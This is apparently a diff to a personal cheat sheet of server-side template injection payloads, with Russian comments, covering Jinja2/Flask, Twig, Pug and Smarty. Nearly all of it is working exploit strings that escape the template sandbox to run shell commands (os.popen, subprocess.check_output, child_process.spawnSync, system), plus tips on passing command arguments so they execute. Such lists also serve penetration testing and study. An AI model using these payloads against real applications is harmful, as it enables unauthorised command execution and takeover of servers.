@@ -1,4 +1,20 @@
-jinja2
-config переменная во flask
+# jinja2
+{{7*7}}
 
 {{ config.__class__.__init__.__globals__['os'].popen('pwd && ls -la').read() }}
+
+# Важный момент: функция subprocess.check_output(['ls', '-lah']) для аргументов работает в такой нотации
+{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}
+
+# twig
+{{7*7}}
+
+# Jade/Pug (Node.js)
+#{7*7}
+#{root.process.mainModule.require("child_process").spawnSync("id").stdout}
+# Важный момент: команда spawnSync не может выполнить команду например "ls -la", т.к она не разделяет аргументы, воспринимает их как одну строку. Нужно передать команду и её аргументы в виде массива spawnSync(command, [args], [options]), например:
+#{root.process.mainModule.require('child_process').spawnSync('ls', ['-la']).stdout}
+
+# Smarty (PHP)
+{'Hello'|upper}
+{system("ls")}
